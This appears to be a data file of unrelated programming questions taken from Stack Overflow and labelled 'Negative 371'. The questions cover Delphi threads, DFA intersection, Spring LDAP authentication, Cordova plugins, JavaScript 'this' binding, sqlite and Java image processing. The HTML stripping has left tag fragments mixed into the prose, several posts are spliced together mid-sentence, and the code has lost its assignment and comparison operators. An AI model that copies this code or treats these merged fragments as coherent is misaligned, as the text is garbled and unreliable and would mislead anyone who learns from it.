    lIsWorkerStillBusy  true    for i  0 to lengthWorkers1 do     begin         Workers[i].Start     end     while lIsWorkerStillBusy do     begin         lIsWorkerStillBusy  false         for i  0 to lengthWorkers1 do         begin             if Workers[i].IsCalculated  false then             begin                 lIsWorkerStillBusy  true             end         end         sleep100     end     FindBestNetwork     IsAllWorkersDone  true end codepre  p2nd level of threadsp  precodeprocedure cWorker.Execute begin     IsCalculated  false     Network.UpdateFlows     Network.SolveNetWork  main simulation work     CalculateTotalPower     IsCalculated  true end codepre  pEDIT 2p  pThe reason I create them all suspended is because I store them in an array and before I start them I first have create the workers and their properties.

Let MB be the DFA obtained by swapping the final and nonfinal states of MB. Let M be the product of MA and MB with all unnecessary state removed.p  pHow many states would M have How many final states would M have How many states does MB have This question has been boggling me, I have spent a few hours on jFlap putting together the intersection of these two DFA, for A and B. No success.  Thank you.p

Negative 371 pPerhaps Im asking too much but asking it is much better than assuming it doesnt exists.p  pIn order to create a converter of webpages into single file including all the external resources the html, Im planning to use Data URI Scheme. But the problem with such a conversion is that lots of pages incorporate Javascript codes to come up with the URI of a resource. i. e. its completely ordinary for a page to set the codesrccode of an image with JS.p  pIn worst case scenario, the URI is composed in which cases its absolutely impossible to replace the URI with Data URI Scheme, e. g. codeimg.src  domain.com  somevariable  .pngcode.p  pThe only way I can think of to overcome such scenarios and all other, is to introduce a middle block of code after URI is changed and before it is downloaded. If such opportunity exits, I can work on the requested URI and replace it with appropriate Data URI Scheme. It also benefits from a global Data URI Scheme storage that leads to smaller html file size.p  pDoes anyone know if such opportunity exists Or if one can create itp  pstrong[EDIT]strongp  pHeres how I would like my singlefile webpage to bep  precodeltscriptgt var uridictionary       httpwww.domain.com1.png dataimagepngbase64,iVBORw0KGgoAAAAN...,     httpwww.domain.com2.png dataimagepngbase64,iVBORw0KGgoAAAAN...   function translateURIurl      if uridictionary[url]          return uridictionary[url]          else          return url       ltscriptgt codepre  pThe above is a simplified version of the code that Im planning to inject into the singlefile webpage that Im going to generate.

Negative 371 pIn Netbeans 8.0 I have a project with multiple modules. I want one module to open a file chooser for audio files that the app will play using javax.sound.sampled library. I use codeAudioSystem.getAudioFileTypescode to get the file types that can be used and see that there are only 3 available wav, au and aif but Id also like to be able to deal with mp3, ogg and flac.p  pSo I downloaded the SPIs for the codecs I need. All the documentation tells me that I need only put the jars into the classpath and the codecs will become available to Javas sound library. In my project I want more than one module to be able to use these libraries, so I created module wrappers for them. So, for example, I have in my project one module called emjflac1.3jdkem which wraps two jars emjflac1.3jdk1.4.jarem and emjflac1.3.jarem then I make the module that is going to open the file chooser depend on these modules that wrap jars.p  pStill there are only the same 3 file types available.

Negative 371 pHi I have problem in the following scenariop  pIm using Spring 4.xx with Jackson 2.xx and Im ompelenting a RESTful Web Application. Im now faced with te problem that I need some custom serialzation for one of my models, so i used a custom serilaizer, but i also need to fetch some data out of the database while serializing. So I tried to inject my Serivce into the Serializer but it always stays null.p  pAs far as I have read this happens if you instanciate your object directly, which I guess is what Jackson does. But is there any way to still use Dependency Injectionp  pAlso if I make the class implement the ApplicationContextAware interface and call ApplicationContextgetBean it hangs forever.p  pHere is some code to illustrate my problemp  pSerialzer.javap  precodepublic class TheSerializer extends JsonSerializerltMyObjectgt   implements ApplicationContextAware     Autowired   ITheService theService    ApplicationContext ctx    public vodi serializeMyObject o, JsonGenerator jgen, SerializerProvider provider throws IOException, JsonProcessingException      iftheService  null        theService  ctx.getBeanITheService.class This is where it hangs       If I dont do this I get a NPE if I try to use theSerivice          codepre  pMy configuration is mainly annotaion based, only the databse stuff is done in xml.p  pThank you in advance,p  pwastlp
Negative 371 pThe script downloads historic stock prices from finance.yahoo.com. An array of tickers is used to loops through the script, creats links based on the ticker array and downloads the data associated to each ticker. However, some of the ticker symbols are not up to date anymore and as a result yahoo delivers a 404 page instead of a csv containing price information. The errorpage is then instead stored in a csv and saved to my computer. To not download these files I am looking for the string  Sorry, the page you requested was not found., which is contained within each of yahoos error sites as an indicator for a 404 page.p  pBehaviour of the code output, see below codep  pThe code runs through all tickers and downloads all stock price .csvs. This works fine for all ticker, but some ticker symbols are not used anymore by yahoo.

All files also the good ones containing actual data are downloaded in the directory cUsersW7ADMstockpriceleecherdata2.p  pProblemp  pI would like for the code to not download the 404 page into a csv file, but just do nothing in this case and move on to the next ticker symbol in the loop.

Negative 371 pI am trying to implement USB communication between an Android Nexus 7 tablet and an Atmel SAM D21 microcontroller. Im trying to achieve relatively high speeds near 10 Mbs. The Atmel microcontroller apparently supports CDC, HID, and MSC protocols. Ive heard that I shouldnt use HID for the speeds I want, and I dont think MSC is supported on Android, so I was going to try and implement CDC. p  pI think I know how to enumerate the USB devices attached to my Android tablet from examples Ive seen online, and how to grab their various attributes, but I dont know how to actually communicate. p  pIs there any example code that someone could point me to for implementing CDC USB communication on an Android tablet I am new to USB, and the documentation for the USB API is a little confusing to me.

Some example code that I can learn from would really be appreciated. Thanksp

So the US will display as mmddyyyy and I want the values picked in that order, but in Spain it will display as ddmmyyyy and in that case I would like the values picked in emTHATem order.

Im not looking to make modifications to the source datepicker code if I dont have to.p  pAny ideas or suggestions would be greatly appreciated.p

Negative 371 pEdit I was able to import a plugin from GitHub Auth0 in VS successfully. The problem seems to be in the parsing of certain plugins like one Im really trying to install which is the latest version of OpenTok for Cordova. The latest version is only on GitHub so Im stuck with this crashing.p  pWhether youve installed Cordova into Visual Studio 2013 SP4 or are using Visual Studio 2015 Preview which comes with Apache Cordova VS will crash when you try to import certain custom Cordova plugin to your project. You can replicate this issue by creating a Cordova project, right clicking confix.xml  View Designer  Plugins  Custom. When trying to import from Github or downloading and importing locally neither works. Visual Studio will crash for example when inputting a hrefhttpsgithub.comsongzcordovapluginopentok relnofollowhttpsgithub.comsongzcordovapluginopentoka or the URL of the .git with the same error as in this screenshotp  pimg srchttpi.stack.imgur.comIH8a6.png altError Before Crashp  pThe error reported when the opentok crash happens isp  hr  pProblem signaturep  pProblem Event Name   CLR20r3p  pProblem Signature 01 devenv.exep  pProblem Signature 02 14.0.22310.1p  pProblem Signature 03 546094b0p  pProblem Signature 04 mscorlibp  pProblem Signature 05 4.5.27.0p  pProblem Signature 06 545ca51fp  pProblem Signature 07 48ddp  pProblem Signature 08 27p  pProblem Signature 09 System.ArgumentNullExceptionp  pOS Version   6.3.9600.2.0.0.256.48p  pLocale ID    1033p  pAdditional Information 1 5861p  pAdditional Information 2 5861822e1919d7c014bbb064c64908b2p  pAdditional Information 3 a10fp  pAdditional Information 4 a10ff7d2bb2516fdc753f9c34fc3b069p  hr  pVisual Studio will then crash and the plugin never gets added. The only plugins you can add are the ones in the Core list within VS. Ive also tried installing them from the command line first navigating to the projects directory Not the folder with the sln file of course, the folder below that with all the project files and it says that its not a Cordova project. Ive also tried manually downloading the plugin and adding it a directory that Ive added to the solution and then importing but that didnt work.p  pIf I knew how to manually use the plugin by importing all the files and referencing them somewhere in my Cordova project as javascript or xml references I would but I wouldnt know how to do that If thats even a solution that would work for compiling to Android and IOS and I have tried.p  pThis is a big problem and its devastating me because I really want to use Cordova and this is my first experience. I want to use VS because its a great environment to develop and testemulate in and Cordova doesnt come an IDE or the same emulators. I dont know of any other IDE to develop Cordova in where I can import plugins and preview my apps like in VS They use special emulators that dont require the use of the Android SDK emulators.p  pAny help would be greatly appreciated. I have no idea what to do. Ive submitted bug reports here a hrefhttpsgithub.comsongzcordovapluginopentokissues137 relnofollowhttpsgithub.comsongzcordovapluginopentokissues137a here a hrefhttpsgithub.comalongubkinphonertcissues123 relnofollowhttpsgithub.comalongubkinphonertcissues123a and here a hrefhttpsissues.apache.orgjirabrowseCB8279 relnofollowhttpsissues.apache.orgjirabrowseCB8279a . Dont know how that will turn out. Ive also tried updating Web Essentials in VS2013 but that didnt work either.p  pThanks for anything you can think of.p

Negative 371 pI am having trouble defining the proper terminology and if my understanding of the following code is correct.p  pI create a constructor functionp  precodefunction BoardGame       this.count  10     this.random  Math.floorMath.random  100  1   BoardGame.prototype.getNumber  function      this is a button that is clicked     .inputField.onclick, function event          this.guess parseIntinputField.val, 10         inputField.val           this.validChecker       .bindthis   BoardGame.prototype.validChecker  function      if this.guess lt 1  this.guess gt 100      warning.appendltpgtltpgt      BoardGame.prototype.newGame  function       game  new BoardGame   document.readyfunction     game  new BoardGame     game.getNumber  codepre  pIn the document.ready function a new instance of a BoardGame is created and the reference is set to the codegamecode variable in the global scope.p  pThen, the event listener is created.p  pWhen the event listener inside of getNumber is clicked, it passes the this context game and it uses that as the this reference.  It calls codethis.validCheckercode.p  pAt some point, the codegame.newGamecode is invoked. Now, a new instance of boardGame is reassigned to the game variable.  If I look into my this references, it references the old BoardGame object before the reassignment not the new BoardGame instance recently created.p  pIf I change my newGame code to thisp  precodeBoardGame.prototype.newGame  function       BoardGame.callthis  codepre  pAnd run the newGame function, the this references, updates and changes the current object properties to the properties in the BoardGame constructor.  It goes to the actual object instead of reassigning.  Im not sure why this makes such a big difference, shouldnt the context of this change to the new assigned objectp  pWhen I call new BoardGame in the newGame function, why doesnt the this references change to the new objectp  pIt seems like there is a difference between changing the current object vs reassigning a new Object, even though I can change properties on the object. What is going on herep  pWhen I call new BoardGame in newGame and the this references the old object after the reassignmnt, what is keeping the reference to the old object, is this a closure scope Object by reference vs value conceptp  pEDIT  I would like to add that when I reset the game var with new BoardGame and then click the button, this references the old object. But if I were to call codegame.getNumbercode on its own line, the this references the new game object, which is what I expect.p  pI believe the base of what is happening is related to this example even though I dont have a 100 clear grasp of the concept.p  precodevar a  a A var b  a  a  hello b  still references a A codepre  pSo in my scenario, the context of this when the event listener is created is the original object.  Then when codenew BoardGamecode is called in the newGame function the game references changes but the this reference is still referencing the original object not sure why that doesnt change with it.p  pWhen we use the BoardGame.callthis, this refers to only one object in all of the code, no matter where we look.  We arent ever creating a second object.p

Negative 371 pI have an ASP.NET application running under IIS.  In response to an a hrefhttpstackoverflow.comq276456327850earlier questiona about how to track down longrunning requests and general poor performance, and after seeing other user reviews, I accepted a suggestion to use New Relics APM product.p  pIt installed nice and easily and started reporting, but all the longrunning requests were showing me was a huge block attributed to codeMvcHandler.BeginProcessRequestcode.  It seemed that we needed to buy the Pro version of the product in order to see more detail than this.  So we did.  And guess what  it still didnt show any more detail.  So I got in touch with their tech support which, incredibly, only operates from 08001800 PST, and they tell me that in order to get more detailed information, I have to specifically include every single method that I want to profile.  And not just the API method, either  every single underlying method has to be explicitly included for profiling  And, to boot, every change to the profiling information has to be accompanied by an IIS restart, which Im sure our users will absolutely emloveem.  In other words, if users complain that a certain action is performing really slowly on the production site, Ill have to add my custom instrumentation to the config file, and wait until after hours to deploy it and restart IIS so that tomorrow the users can experience the same performance problems, but now Ill be able to debug it more effectively.p  pI find this impossible to believe, and I am falling back on the possibility that either the tech guy who emailed me didnt understand my question, or else he doesnt know his own product, because the product has received so many good reviews, and I just cannot accept that in order to get detailed performance profiling I have to turn myself into a pretzel like this.p  pSo I turn to other users and fans of New Relic to give me better tech support than the company itself could provide.  What am I missing  What is the secret switch to get more detailed performance profiling, without resorting to this ridiculously onerous custom instrumentationp  pHint I already researched the codeMvcHandler.BeginProcessRequestcode issue and found lots of answers relating to codeSessionStatecode.  My projects codeSessionStatecode has been set to codeOffcode for over a year already, so this is not the issue.p

Negative 371 pRight now my FMX project is totally based on Livebinding to connect the datasources to my editors on the form.p  pIt works nice, besides to be slow and do not use paging loading TLisView.p  pHowever, I have many different datasources and the amount of data can be huge and connections eventually slow. p  pMy idea is to keep the user interface responsive and let threads in the background make the data load opening the datasources and put them it the right state. After that assigning the datasource to the controls on the form.p  pI have played with that with LiveBinding but I cannot mix the main thread with background ones. Some problems happened.p  pHaving to load each field record to each control manually seems to be extremely unproductive. I have almost all the controls that I use already wrapped, I made my own controls based on the FMX ones, so I can have the possibility to add more functions.p  pI was wondering if there is something already done. Any class or library that I could use to map the source and targets and that I can have the control to activate when it is needed, since I can have many datasources in loading state by a thread.p

Negative 371 pI have previously asked this question but didnt get an answer. Im trying to learn model view controller pattern and developing a simple framework for learning purposes.p  pI understand it is hard to adopt mvc pattern to php and most of the popular frameworks use mvc variations including myself, not the actual pattern itself. In most of these variations controller gets input from the user and sends it to the model, model process this input and gives a response back to the controller and in final step, controller chooses the appropriate view and sends information to this view based on models response.p  pIn my design, controllers use a view instance that simply look like thisp  precodeclass view      public function renderfilename         requireonce templatesfilename.php          public function addDatakey,value         thisgtkeydata       codepre  pIn this context, what is the best way for the controller to send regularly displayed information to the viewp  pTo give an example, lets say we have a social network application which has a top menu that displays notifications to the user. This menu is, core part of the view and being displayed on strongevery page of the applicationstrong. To my understanding, this means that once the user is logged in to the application, controllers must add notification information to the view instance in every action method. p  pI was wondering if there is a more elegant way to do this.p
Negative 371 pI am attempting to round the corners of a codeNSScrollViewcode, and I found a hrefhttpstackoverflow.coma138660341795356this answera which looks promising. So Ive placed a codeNSScrollViewcode inside the XIB, created a new file thats a subclass of codeNSScrollViewcode, then set the scroll view to that class in the XIB. Ive placed the code in codedrawRectcode yet when I run the app and get to that screen, the scroll view appears but codedrawRectcode is never called. However codeinitWithCodercode is called. I cannot figure out what Ive done wrong here, or what I can do to get the desired behavior. If I place the code in codeinitWithCodercode the rounded corners appear black instead of translucent.p  pThe scroll view exists as a subview of a tab view that exists in a view controller. This view controllers view appears on the second screen. Once the user presses a button, the boxs codecontentViewcode is set to this view controllers view.p

Negative 371 pI have the following scenario. A card reader that reads an ID card and gets the data and displays them in a table webpage. What I am doing now is removing the table, inserting the ID Card image in the background and superimposing the card data on the image in the appropriate position, i.e. the user photo on the cards photo position, the users name on the cards Name position etc. When I try to put the card image in the background either directly as tableform background image, or through css, most of the time it doesnt show right or does not show at all. when it shows, I can not get the data to superimpose correctly. I have tried through css, divs with zindex etc, and nothing works correctly. I can see the data but can not arrange them on the ID card image. Heres the code I have been working on.

In myADProvider bean definition, the constructors first argument fsapps.company.uni is used to create a principal in the form usernamefsapps.company.uni and to build the baseObject for the search request with a baseObject of the form dcfsapps,dccompany,dcuni.p  pThe second constructors argument is used to establish the communication. The next element of property type with namesearchFilter will invoke the setSearchFilter method of the class ActiveDirectoryLdapAuthenticationProvider to set the search filter this was what I was seeking originally to make some progress. So, it is now set to search ampsAMAccountName0objectClassuser.p  pWith this setup, I can see in WireShark the LDAP conversation and the binding succeeds. The bind response is success. Next, the search request succeeds as well but does not return any result. Hence, I am still getting the following in my logp  precode20150416 103028,201 DEBUG o.s.s.a.ProviderManager.authenticate [http84432] Authentication attempt using org.springframework.security.ldap.authentication.ad.ActiveDirectoryLdapAuthenticationProvider MDC 20150416 103028,201 DEBUG o.s.s.l.a.AbstractLdapAuthenticationProvider.authenticate [http84432] Processing authentication request for user myusername MDC 20150416 103028,294 DEBUG o.s.s.l.SpringSecurityLdapTemplate.searchForSingleEntryInternal [http84432] Searching for entry under DN , base  dcfsapps,dccompany,dcuni, filter  ampsAMAccountName0objectClassuser MDC 20150416 103028,294 INFO o.s.s.l.SpringSecurityLdapTemplate.searchForSingleEntryInternal [http84432] Ignoring PartialResultException MDC 20150416 103028,310 DEBUG o.s.s.w.a.AbstractAuthenticationProcessingFilter.unsuccessfulAuthentication [http84432] Authentication request failed org.springframework.security.authentication.BadCredentialsException Bad credentials MDC 20150416 103028,310 DEBUG o.s.s.w.a.AbstractAuthenticationProcessingFilter.unsuccessfulAuthentication [http84432] Updated SecurityContextHolder to contain null Authentication MDC 20150416 103028,310 DEBUG o.s.s.w.a.AbstractAuthenticationProcessingFilter.unsuccessfulAuthentication [http84432] Delegating to authentication failure handler org.springframework.security.web.authentication.SimpleUrlAuthenticationFailureHandler2876b359 MDC codepre  pI believe I am almost there, but still can use a little help if someone can provide any. After careful examination, it appears the first constructors argument being used to construct the baseObject AND the userPrincipalName is my problem. In our setup, the userPrincipalName is using a domain name which is not the domain name in the LDAP url i.e. campus.company.com. So far so good, I can then change the argument to match our domain name used to construct our users principals. Now, the problem is this will change the baseObject which must match the LDAP urls schema i.e. fsapps.company.uni.p  pFrom the documentation, there is only one method to set the search filter however the constructor can use one, two or three arguments. The third argument is providing the baseObject value.p  pMy problem is then solved by the following configuration where I have to use all the available setters and constructors arguments to make it working.

Negative 371 pI have written a custom slide up menu component, which uses UIKitDynamics to slide the panel up and down from the view.

My only thought is that IE doesnt like that this is all done in an AJAX success function Not sure.

Negative 371 pI have a table with codeTEXTcode, codeINTEGERcode, codeREALcode and other data types.p  pI wrote a generic sql function to read results for all queries using codesqlite3columntextcode like sop  pcodechar dataAsChar  char  sqlite3columntextcompiledStatement, iicodep  pAlthough I should be using codesqlite3columnintcode etc. to read the numeric values, the above code seems to work for me. I get the number values as string which I later convert to int using code[numberAsString intValue]code.p  pSince I am using a generic function to read all my db values, this is very convenient for me. strongBut is there something that can go wrong with my codestrong p  pI could use codesqlite3columntypecode for each column to determine the type and use appropriate function.

Negative 371 pI have created my first Java EE 7 app with a pure jaxrs front end interface. all is tested and is working fine. Now i want to apply a security layer role based, applied on resources or methods. I have a clear imagination of what i want at the end don know if it makes sense, but i am unsure how to get there what ingredients to use, in which order. So here is what i wantp  ul lii want to use wildfly as identity provider wildfly should store user credentials  in a db, encryptedli limy app is completely rest based, so i need some way to put authentication info into requests tokenli libasic auth would be ok each user must authenticated, form not needed, no self registration neededli lito restrict access to certain resources methods i want to use Java EE 7 standards annotations, interceptors...li ul  pDoes this make sense If yes are there examples or docs that do it the same way or at least very similar I found a hrefhttpsgithub.comjbossdeveloperjbosspicketlinkquickstarts relnofollowjbosspicketlinkquickstartsa but this contains many examples and i am not sure which fits best. Do i need picketlink at allp  pSince i have a User with a UserRolean enum in my persistence tier i think i need some kind of mapping from roles provided by IDP Wildfly and my own  rightp

Negative 371 pIve been trying to make a twist on a dodgerlike game, where some blocks make you grow and others make you shrink. Im also planning to add a red one of which is supposed to make you lose a lifeyou will have 3 lives starting out, and various others with their own attributes. However Ive hit a bump in the road in having the falling blocks spawn randomly, which is something that would be required in a broad range of games.p  pMy plan is basically that i would want to have the blocks respawn at random locations each time and at some point i want the amount of falling blocks to increase as well to further mount the difficulty.p  pHere is my current progress.

Negative 371 pI have this exercise that asks me to create a program to count the odd digits of a number, so if the number is 12345 it will count to 3, because of 1, 3 and 5. I started creating a recursive method, my very first one, with a ramified ifelse. The point of using it was to see codeif inputNumber  2  0code. If yes, the last digit of the number would be a 0, 2, 4, 6 or 8, because only those digits give 0 if moduled by 2, so oddDigitsCounter wouldnt grow. Else, codeif inputNumber  2  1code, the last digit of the number would be 1, 3, 5, 7 or 9. codeoddDigitCountercode, so. To check digit by digit I tried to divide the number by ten because it is a codeintcode variable, so it doesnt saves any digit after the floating point. This is the method since nowp  precodepublic static int oddDigitCounter int number       int oddCount, moduledNumber, dividedNumber, absoluteInput      oddCount  0     absoluteInput  Math.absnumber     moduledNumber  absoluteInput  2     dividedNumber  absoluteInput  10      if absoluteInput  0          oddCount  oddCount       else if moduledNumber  0          oddCount  oddCount         oddDigitCounterdividedNumber      else  number  2  0          oddCount         oddDigitCounterdividedNumber       return oddCount codepre  pWhy it gives me an infinite recursion Whats wrong Why Any other way to solve this Any idea for improving my programp

Negative 371 pstrongContextstrong Im trying to create an animation in java. The animation is simply take an image and make it appear from the darkest pixels to the lightest.p  pstrongThe Problemstrong The internal algorithm defining the pixels transformations is not my issue. Im new to Java and Computing in general. Ive done a bit of research, and know that there are plenty of APIs that helps with image filterstransformations. My problem is performance, understanding it.p  pTo the implementation ive created a method that do the followingp  ol liReceives an BufferedImage.li liGet the WritableRaster of the BufferedImage.li liUsing setSample and getSample, process and change pixel by pixel.li liReturn the BufferedImage.li ol  pAfter that, i use a Timer to call the method. The returned BufferedImage is attached to a JButton via setIcon after each call.p  pWith a 500x500 image my machine takes around 3ms to process each call.  For standard 1080p images it takes around 30ms, wich is about 33 frames per second.p  pMy goal is to processanimate FullHD images at 30fps... And i will not be able to with the path Im following. Not in most computers.p  pWhat im getting wrong How i can make it faster Using getDataBuffer or getPixels instead of getSample can improve itp  pThanks in advance And sorry my english.p  hr  pstrongPartial Conclusionsstrong Thanks to some help here. Ive changed concept. Instead of using getSample and setSample Ive stored the pixels ARGB informations of the BufferedImage into an array. So i process the array and copy it all at once into a Raster of another BufferedImage.p  pThe process time reduced from 30ms  getset sample  to 1ms.  measured poorly, but in the same machine, enviroment and code .p  pBelow is a little class i coded to implement it. The class can filter pixels only below a Brightness level, the other pixels become transparent  alpha  0 .p  pHope it helps who search for the same solution in the future.
